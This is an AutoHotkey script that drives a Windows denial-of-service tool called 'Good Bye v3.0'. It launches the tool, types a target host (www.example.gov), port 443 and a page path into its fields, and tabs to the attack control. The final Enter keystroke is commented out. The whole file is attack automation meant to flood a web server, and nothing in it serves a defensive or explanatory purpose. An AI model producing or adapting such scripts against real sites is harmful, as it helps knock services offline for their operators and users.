#CommentFlag //

// ------------------------------------------------
// CONFIG
// ------------------------------------------------

goodbye_path = C:\DoStools\Good Bye v3.0\Good Bye v3.0.exe
target_url = www.example.gov
target_uri = /index.html
target_port = 443	

// ------------------------------------------------
// MAIN SCRIPT
// ------------------------------------------------

// Execute ByteDOS
Run, %goodbye_path%

// Give focus to GoodBye window
WinActivate, GOOD BYE v3.0
WinWaitActive, GOOD BYE v3.0

// Target URL
Loop 9 {
	Send {Del}
}
SendInput, %target_url%

// Target port
Send {TAB}
Send {Del}
Send {Del}
SendInput %target_port%

// Target URI
Send {TAB}
Send {TAB}
Send {TAB}
Loop 10 {
	Send {Del}
}
SendInput %target_uri%

// Execute attack
Send {TAB}
Send {TAB}
Send {TAB}
//Send {Enter}